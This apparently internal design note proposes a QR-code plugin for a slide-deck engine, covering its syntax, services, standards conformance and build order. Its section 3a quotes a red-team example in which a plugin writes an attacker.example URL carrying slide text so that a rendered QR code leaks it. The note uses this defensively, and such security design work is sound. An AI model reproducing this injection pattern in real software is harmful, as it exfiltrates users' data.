# A QR plugin (2026-10-16)

Status: proposed. The owner's open decisions are in §6. Sibling: `2026-10-16-media-plugins.md` (the `video`
plugin is the QR service's third caller). Parents: `2026-09-27-plugin-system.md` (the contract, including
`services` and a component's `plugins.optional`), `2026-10-14-plugin-inline-door.md` (`@kind{…}`),
`2026-07-01-qr-authoring-grammar.md` (the `qr` variant and its postfix-key bullets, which this note keeps).

## 1. The answer

- **One plugin, `qr`, owns QR codes.** It holds the encoder (`lib/engine/qr.js` today), the payload rules
  (`qr-payload.js`), the card kernel (`connect/_qr-card/qr-card.js`) and the QR styles. The engine stops
  importing `qrcode`.
- **Any slide can carry a code**, written as a Segno record in inline code:

  ```md
  `@qr{https://laticent.com/join, title="Scan to join"}`
  `@qr{mailto:team@example.com, c3}`
  `@qr{wifi={ssid=Offsite-Guest, password=boardroom2026, security=WPA2}, title="Guest Wi-Fi"}`
  `@qr{contact={name="Ada Okafor", title=CTO, email=ada@laticent.io}}`
  `@qr{"Room 4B, second floor", title="Find us here"}`
  ```

  A paragraph holding only the record renders as a block figure, beside or below the slide's content. A
  record inside running text renders as a small inline code.
- **The layouts that draw a code today keep their syntax but stop reading the rendered slide.** `wifi` and
  `contact` declare `plugins.requires: ["qr"]`; `video` declares `optional: ["qr"]`, so a video slide without
  the plugin still shows its poster. All three, and the `qr` variant (`closing qr`, `divider qr`,
  `split-panel qr`), read their payload from the author's bullet tokens in the engine, before any plugin
  draws, and call the plugin's encoder (§3a).
- **A deck with no code loads none of it**, the way icons and avatars work.

## 2. What exists today

Checked against the source on 2026-10-16.

| Piece | File | Role |
|---|---|---|
| Encoder | `lib/engine/qr.js` (76 lines) | `qrSvg(data, {ecLevel, margin, label})`: wraps `qrcode`'s synchronous SVG renderer and makes it palette-blind (`currentColor` modules, `transparent` ground) |
| Card kernel | `lib/components/connect/_qr-card/qr-card.js` | parses `- value \`key\`` bullets and builds the two-zone card for `wifi` and `contact` |
| `qr` variant | `_qr-card/qr-general.transform.js`, adapter `lib/transformers/qr-general.js` | adds a `<figure class="qr-figure">` to `closing`, `divider` and `split-panel` |
| Payload rule | `_qr-card/qr-payload.js` | `PAYLOAD_URL_RE` (`https?:`, `mailto:`, `tel:`, `WIFI:`, `BEGIN:VCARD`), duplicated inline in `lint-core.js:4426`, with a must-match comment at `:4423` |
| Lint | `lib/authoring/lint-core.js:4417-4447` | `qr-missing-payload`, `qr-empty-payload`, `qr-duplicate-payload` |
| Styles | `_qr-card/qr-general.css`, bundled always by `tools/build-css.js:176,570` | the QR figure and its visible title |
| Tokens | `--qr-ink`, `--qr-paper` (`tools/check-ownership.js:12380`) | per-deck module and quiet-zone colors |
| Callers | `wifi`, `contact`, `video` (`video.transform.js:97`), the `qr` variant | four layouts, one encoder |

**Cost today:** `lib/transformers/registry.js:50` requires `qr-general`, which requires the encoder, which
requires `qrcode` at module load. Measured here: requiring `lib/engine` leaves `qrcode` in the module cache,
and `require('qrcode')` alone takes 31–55 ms cold (six runs across two sessions; it varies with the machine). Every CLI render and every Studio engine
start pays it, with or without a code in the deck. The QR styles are in every deck's CSS bundle too.

**What an author cannot do today:** put a code on a slide whose layout is not one of those six. A
`statement`, a `chart` or a `team-profile` slide cannot carry one.

## 3. The model

**Manifest contributions** (`lib/plugins/qr/qr.manifest.json`):

| Contribution | What |
|---|---|
| `inline.qr` | the `@qr{…}` kind; no sigil (§6, decision 2) |
| `services` | `encode(data, opts) → svg`, `card(fields, layout) → html`, `payloadKind(value)`; the callers in §1 |
| `registers.qr` | a deck-level `qr:` register: the default ink (`c1` … `c12`). Size is the shared `sm` / `md` / `lg` (media note §4.7, with a floor so a code stays scannable); the frame is the shared frame system |
| `styles` | `qr-general.css` and the card styles, loaded only when the plugin is |
| `tokens` | `--qr-ink`, `--qr-paper` |
| `render` | `parity: "equivalent"`, `degradesTo: "source"`: a deck that switches the plugin off shows the payload as text |

**The record's fields:** the payload first, then `title="…"` (what the code is for, at a glance: "Join the guest
Wi-Fi") and `description="…"` (a sentence more), and `c1` … `c12` (the ink, with a lint for scan contrast). These are
the shared media fields in `2026-10-16-media-plugins.md` §4.7; the screen reader, the tooltip, narration and the
Guide all read them. A missing title is built from the payload ("Join the Guest Wi-Fi network"). Error correction is
chosen by Lattice, not the author. Placement belongs to the layout the code sits in; size is the
shared relative `sm` / `md` / `lg`, with a floor that keeps a code scannable from the back of a room.

**Three things, kept apart.** An early draft of this section put a Wi-Fi network's fields and a contact's fields
in the same record as the code's own fields, and it showed at once: a contact's job `title` collided with the
code's own `title`. That collision is why a payload is a nested record: inside `contact={…}`, `title` is the job
title; outside it, `title` names the code. They are three different things, owned in three different places:

| Layer | What it is | Owned by | Its words |
|---|---|---|---|
| **The code** | a QR drawing: what it is called and how it is drawn | the `qr` plugin's record | `title`, `description`, `c1` … `c12` (the shared media fields, `2026-10-16-media-plugins.md` §4.7) |
| **The payload** | what the code carries to a phone, in a format a phone understands | the `qr` plugin's payload formats | the format's own fields: verbatim for a link, an address or text; `ssid`, `password`, `security` for Wi-Fi; `name`, `title`, `org`, `email`, `phone`, `url` for a contact |
| **The card** | the readable slide around a code: the network and password, the person's name and role | the `wifi` and `contact` components | the components' bullets, laid out by the component |

**The payload is a nested record**, so its fields never meet the code's fields. Segno parses a record as a named
value (checked against the shipped reader, `docs/src/lib/segno/dist/read.mjs`, 2026-10-16):

| What it is for | Written |
|---|---|
| a link, an email, a call | `@qr{https://laticent.com/join, title="Scan to join"}`, `@qr{mailto:team@example.com}`, `@qr{tel:+1-555-0142}` |
| plain text | `@qr{"Room 4B, second floor"}` |
| a Wi-Fi network | `@qr{wifi={ssid=Offsite-Guest, password=boardroom2026, security=WPA2}, title="Guest Wi-Fi"}` |
| a contact | `@qr{contact={name="Ada Okafor", title=CTO, org=Laticent, email=ada@laticent.io}, title="Save my details"}` |

- **The payload fields take the standards' names** (§4.7 rule 2 of the media note). Wi-Fi takes the WPA3
  specification's field names, `ssid`, `password`, `type`, `hidden` (and `id`, `trdisable`, `public-key` once §7 is
  read), with today's `security` (`auth`, `encryption`) kept as an alias of `type` because it is clearer and already
  shipped; encoded as `WIFI:T:…;S:…;P:…;;` (`wifi.transform.js:31-41`). A contact takes vCard's property names,
  `title`, `org`, `email`, `url`, `note`, `adr`, and `given` / `surname` for `N` (xCard's names for N's parts, RFC 6351; `family` accepted), except where vCard's spelling is
  cryptic: `name` stays for `FN` and `phone` for `TEL`, with `fn` and `tel` accepted beside them (and today's
  `role`, `company`, `mobile`, `web`, `site` kept as aliases); encoded as vCard 3.0 (`contact.transform.js:30-45`). Inside `contact={…}`, `title` is the job title,
  as on the `contact` slide and in the vCard, and it cannot be mistaken for the code's own fields one level up.
- **Each format is one row in a table of payload builders**: its fields and aliases, which are required, how it
  encodes and escapes. It is the same strategy pattern as the video hosts and the media sources, so a new format
  (an SMS, a calendar event, a location) is one row.
- **The components keep their own semantics and borrow only the format.** `wifi` and `contact` stay layouts. They
  read their bullets from tokens (§3a), build the same `wifi={…}` or `contact={…}` payload from them, ask the plugin
  to encode it, and draw their readable card beside the code. What the card shows, and how, is the component's
  business; the plugin never knows a card exists. A `@qr{wifi={…}}` on any other slide draws only the code and its
  title, because there is no card there.
- **A payload is encoded verbatim**, as today: a format escapes what it requires (`;` `,` `\`) and never rewrites what
  the author wrote. A Wi-Fi password on a slide is the author's choice in both forms, as today.

**The payload is not a media source.** `@qr{asset:x}` encodes the text `asset:x`. A QR carries data to a
phone; it never loads anything at render time, so the sources registry in the sibling note does not apply.

**PDF, PNG and PPTX** get the same SVG they get today. The HTML player and the presenter can also make the
code a link to its own payload when the payload is a URL, as the video poster already is.

## 3a. The payload comes only from the author's block (added 2026-10-16, after #2725)

Today's QR passes are a way to leak a slide (recorded by a red team on 2026-10-12 in
`lib/transformers/rebuilt-classes.js:4-11`; PR #2725 is closing it out). `qr-card.js` pulls its fields "from the
RENDERED `<li>`", and the `qr` variant auto-detects a bare-URL bullet and takes an `<a>`'s `href`
(`qr-general.transform.js`). Both run again over the finished DOM, plugin output included. A zip plugin that
writes `https://attacker.example/?d=<slide text>` onto a `closing qr` slide gets that address printed as a
scannable code. No request is made, but a phone in the room carries the slide's text away. The full rule is
`2026-10-16-media-plugins.md` §4.5. For QR it means:

- **`@qr{…}` resolves on the markdown-it token path only**, and its manifest marks the kind
  `address: true`, so the runtime mirror (`transformInlinePills`, `lib/runtime/index.js:1115`) never draws
  one. A plugin's `<code>@qr{…}</code>` stays text.
- **`wifi`, `contact` and the `qr` variant read the author's bullet tokens**, not the rendered `<li>`. Their
  DOM passes are deleted, along with their rows on #2725's `SANCTIONED_SLIDE_TEXT_ADDRESS_READERS` (pending in #2725, not yet on its branch at
  `98a69d6`), in the
  commit that replaces them.
- **The variant's bare-URL auto-detect does not survive on rendered HTML.** On tokens it can stay, because
  a token is the author's text. `lint:deck --fix` offers `@qr{…}` for a variant slide, so a deck can move to
  the explicit form.
- **Evidence:** the same attack test as the media plugins, for `@qr`, `wifi`, `contact` and each `qr`
  variant host. A plugin draws on the slide, and the rendered QR decodes to the author's payload, never to
  the plugin's text.

## 3c. Standards: what a QR must follow, and where today's code stands (added 2026-10-16)

Two layers have standards: the symbol (the black-and-white squares) and the payload (the text a phone reads). The
plugin follows both, and the table says where today's shipped code does not yet.

| Standard | What it requires | Today | Plan |
|---|---|---|---|
| **ISO/IEC 18004** (the QR symbol) | versions, masking, error correction L 7 % / M 15 % / Q 25 % / H 30 % | met: the `qrcode` library builds the symbol; `ecLevel: 'M'` (`qr-card.js:83`) | keep; Lattice chooses the level (M, or H when a frame or small size makes damage likelier), with no author word |
| ISO/IEC 18004, quiet zone | a light margin of **at least 4 modules** on every side | **short at the encoder**: `margin: 3` (`qr-card.js:83`). The `wifi` and `contact` cards add paper padding around it (`wifi.styles.css:104-106`), which likely brings it past 4, but nobody measured it | the encoder emits 4 itself, so a code on any slide is correct without help from a layout |
| ISO/IEC 18004, character set | byte mode defaults to ISO-8859-1; UTF-8 text must be declared with an **ECI** header (Extended Channel Interpretation, designator 26) | **not met**: no ECI. A CLI export of the `contact` slide with `José Núñez` decodes in zbar 0.23.93 as `Jos矇 N繳簽ez`, and an SSID `Café-Guest` decodes garbled the same way. The same text with ECI decodes correctly (segno's encoder, same decoder, 2026-10-16) | emit ECI 26 when a payload has any character outside ASCII. Some older scanners ignore ECI, and phone cameras often guess UTF-8 correctly without it, so ship it only after a check on an iPhone and an Android camera (UNVERIFIED on phones today) |
| Symbol contrast (ISO/IEC 18004; print grading in ISO/IEC 15415) | dark modules on a light ground with enough contrast; light-on-dark is allowed by the standard but many scanners fail on it | met on the cards: `--qr-ink` on `--qr-paper`, defaulting to near-black on white | `c1` … `c12` (decision §6) keeps dark-on-light only, and lint refuses a slot whose contrast against the paper is too low, in light and dark mode |
| **RFC 3986** (URLs), **RFC 6068** (`mailto:`), **RFC 3966** (`tel:`) | the address as a valid URI | met: encoded verbatim (`PAYLOAD_URL_RE`, `qr-payload.js:11`) | keep |
| **Wi-Fi URI**, Wi-Fi Alliance WPA3 Specification §7 (registered with IANA as the provisional `wifi` scheme) | `WIFI:` then `T:` (security type), `R:` (transition disable), `S:` (SSID), `H:true` (hidden network), `I:` (password identifier), `P:` (password), `K:` (SAE-PK public key), ending `;;`. Values are printable characters with `;` excluded, or percent-encoded. The format is backward compatible with the older ZXing format phones already read | **partly met**: only `T`, `S` and `P`. Special characters are escaped the ZXing way (a backslash before `\ ; , : "`, `wifi.transform.js:24`), which is not the WPA3 grammar's percent-encoding. A WPA3 network is encoded as `T:WPA` (`wifi.transform.js:22`), and the correct value for a WPA3-only network is not confirmed. No hidden-network flag | read §7 of the WPA3 specification itself (it is a free download from the Wi-Fi Alliance; the grammar above comes from a secondary copy). Add `hidden`. Choose the escaping and the WPA3 `T:` value by joining test networks from an iPhone and an Android camera |
| **vCard 3.0**, RFC 2426 | `BEGIN`, `VERSION`, **both `N` and `FN`**, `END`; lines end in CRLF; `\` `;` `,` and newlines escaped in text | **partly met**: escaping is right (`contact.transform.js:26`), but there is **no `N`** property and the lines end in a bare LF (both seen in the zbar decode above). Most phones tolerate both; a strict importer can show a contact with no name | emit `N` and CRLF. `N` needs the family and given names apart, which a single `name` field cannot give without guessing, so the payload gains optional `given` and `surname` fields and falls back to `N:<name>;;;;` |

Not chosen: MECARD (a shorter contact format from NTT DoCoMo, read by most phones but not standardized) and vCard
4.0 (RFC 6350, which needs only `FN` but is read less widely than 3.0).

The fixes to today's `wifi` and `contact` slides are off the path of this note, which is design only. They are logged
as `followups.d/2727-p2-qr-standards-conformance.md`, and slice 1 of §4 owes them, because it moves the encoder and
the formats into the plugin.

## 4. Build order

1. **Move, no visible change.** Create `lib/plugins/qr/`, move the encoder, payload rule, card kernel and
   styles into it, expose them as services, and switch the four callers to the service. Byte-identical output
   on the `connect` and `video` galleries, checked by the existing gallery renders. `npm run bench` before and
   after for the engine start (HARD RULE #19), since the point of the move is that a deck with no code stops
   paying for `qrcode`.
2. **`@qr{…}` on any slide**, the `qr:` register, lint rules for an empty or unencodable payload, Compose and
   autocomplete through the `@` trigger. Demo deck (HARD RULE #9).

Adversarial trio on both slices (HARD RULE #25), because each replaces a pass that reads slide text (§3a).
Slice 1 then cannot be "no visible change" by moving files alone: it moves the payload read onto tokens. Its
proof is byte-identical galleries plus the attack test.

## 5. Options not taken

- **Leave the encoder in the engine and only add `@qr{…}`.** Every deck keeps paying for `qrcode`, and the
  code stays outside the plugin contract that icons and avatars already follow.
- **Make `qr` part of the `video` plugin.** `wifi` and `contact` have nothing to do with video.
- **Retire the `qr` variant in favor of `@qr{…}`.** The variant is a settled grammar
  (`2026-07-01-qr-authoring-grammar.md`) with three lint rules, and on those layouts it places the code where
  the layout expects it. The two forms coexist, and both call one service.

## 6. Open decisions (owner)

1. **Packaging alongside the media plugins.** The media packaging question is on hold; this note assumes `qr`
   is its own plugin whatever that question decides, because its callers are not all media.
2. **A sigil for `@qr{…}`.** `INLINE_TAGS` (`lib/plugins/resolve.js:419`) holds `~ ^ !` and the media note adds
   `>`. Recommendation: none for now, since codes are rarer than icons and the tag set is small.
